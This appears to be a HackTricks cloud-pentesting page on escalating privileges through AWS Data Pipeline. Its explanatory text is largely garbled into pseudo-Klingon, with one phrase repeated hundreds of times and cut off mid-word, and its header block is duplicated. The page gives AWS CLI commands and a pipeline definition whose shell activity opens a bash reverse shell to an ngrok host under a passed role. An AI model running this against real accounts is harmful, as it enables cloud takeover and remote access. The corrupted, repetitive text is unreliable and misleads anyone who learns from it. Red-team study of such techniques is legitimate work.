# AWS - Datapipeline Privesc

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## datapipeline

For more info about datapipeline check:

{% content-ref url="../aws-services/aws-datapipeline-codepipeline-codebuild-and-codecommit.md" %}
[aws-datapipeline-codepipeline-codebuild-and-codecommit.md](../aws-services/aws-datapipeline-codepipeline-codebuild-and-codecommit.md)
{% endcontent-ref %}

### `iam:PassRole`, `datapipeline:CreatePipeline`, `datapipeline:PutPipelineDefinition`, `datapipeline:ActivatePipeline`

Users with these **permissions can escalate privileges by creating a Data Pipeline** to execute arbitrary commands using the **permissions of the assigned role:**

---

# AWS - Datapipeline Privesc

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!HackTricks</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## datapipeline

For more info about datapipeline check:

{% content-ref url="../aws-services/aws-datapipeline-codepipeline-codebuild-and-codecommit.md" %}
[aws-datapipeline-codepipeline-codebuild-and-codecommit.md](../aws-services/aws-datapipeline-codepipeline-codebuild-and-codecommit.md)
{% endcontent-ref %}

### `iam:PassRole`, `datapipeline:CreatePipeline`, `datapipeline:PutPipelineDefinition`, `datapipeline:ActivatePipeline`

Users with these **permissions can escalate privileges by creating a Data Pipeline** to execute arbitrary commands using the **permissions of the assigned role:**
```bash
aws datapipeline create-pipeline --name my_pipeline --unique-id unique_string
```
**DaH jatlh:** pipeline qonwI'wI' jatlhlaHbe'chugh, jatlhlaHbe'chugh vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlhutlhlaHbe'chugh 'e' vItlhutlhlaHbe'chugh 'ej vItlh
```json
{
"objects": [
{
"id" : "CreateDirectory",
"type" : "ShellCommandActivity",
"command" : "bash -c 'bash -i >& /dev/tcp/8.tcp.ngrok.io/13605 0>&1'",
"runsOn" : {"ref": "instance"}
},
{
"id": "Default",
"scheduleType": "ondemand",
"failureAndRerunMode": "CASCADE",
"name": "Default",
"role": "assumable_datapipeline",
"resourceRole": "assumable_datapipeline"
},
{
"id" : "instance",
"name" : "instance",
"type" : "Ec2Resource",
"actionOnTaskFailure" : "terminate",
"actionOnResourceFailure" : "retryAll",
"maximumRetries" : "1",
"instanceType" : "t2.micro",
"securityGroups" : ["default"],
"role" : "assumable_datapipeline",
"resourceRole" : "assumable_ec2_profile_instance"
}]
}
```
{% hint style="info" %}
Qapla'! **role** in **line 14, 15 and 27** vItlhutlh **datapipeline.amazonaws.com** lo'laHbe'chugh **role assumable** vItlhutlh **ec2.amazonaws.com with a EC2 profile instance** lo'laHbe'.

DaH jImej, EC2 instance vItlhutlh **role assumable** vItlhutlh **EC2 instance** (vaj vItlhutlh 'ej vItlhutlh) vItlhutlh (vaj vItlhutlh) vItlhutlh.
{% endhint %}
```bash
aws datapipeline put-pipeline-definition --pipeline-id <pipeline-id> \
--pipeline-definition file:///pipeline/definition.json
```
**ghItlh** **pipeline definition file, crafted by the attacker, includes directives to execute commands** or create resources via the AWS API, leveraging the Data Pipeline's role permissions to potentially gain additional privileges.

**Potential Impact:** Direct privesc to the ec2 service role specified.

## References

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
